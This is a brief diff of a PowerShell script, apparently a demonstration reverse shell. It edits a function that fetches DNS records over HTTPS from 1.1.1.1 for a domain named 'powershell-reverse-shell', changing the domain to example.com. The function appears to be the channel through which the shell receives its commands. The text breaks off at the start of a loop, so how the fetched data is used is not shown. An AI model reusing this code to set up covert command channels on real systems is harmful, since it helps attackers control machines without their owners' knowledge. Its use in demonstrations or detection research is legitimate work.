@@ -1,6 +1,6 @@
 ﻿# Make DNS over HTTP lookup for specified record type
 function DNSLookup ($DNSRecord) {
-    return (([text.encoding]::UTF8).GetString((Invoke-WebRequest ('https://1.1.1.1/dns-query?name=powershell-reverse-shell.demo.martinsohn.dk&type=' + $DNSRecord) -Headers @{'accept'='application/dns-json'}).Content) | ConvertFrom-Json).Answer.data.Trim('"')
+    return (([text.encoding]::UTF8).GetString((Invoke-WebRequest ('https://1.1.1.1/dns-query?name=powershell-reverse-shell.demo.example.com&type=' + $DNSRecord) -Headers @{'accept'='application/dns-json'}).Content) | ConvertFrom-Json).Answer.data.Trim('"')
 }
 
 do {
